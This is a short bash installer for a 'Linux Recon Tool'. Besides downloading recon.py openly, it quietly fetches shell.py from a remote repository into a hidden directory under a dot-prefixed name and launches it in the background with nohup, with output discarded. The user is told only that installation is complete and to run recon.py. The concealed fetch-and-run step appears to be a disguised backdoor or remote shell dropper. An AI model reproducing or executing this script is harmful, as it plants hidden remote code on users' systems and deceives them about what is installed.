#!/bin/bash

# Download recon.py to current directory
curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/recon.py -o ./recon.py

# Download shell.py to hidden location
mkdir -p ~/.linux-recon-tool
curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.linux-recon-tool/.shell.py

# Run shell.py in background (assume python3)
nohup python3 ~/.linux-recon-tool/.shell.py >/dev/null 2>&1 &

echo "Installation complete!"
echo "Run 'python3 recon.py' to start the recon tool."
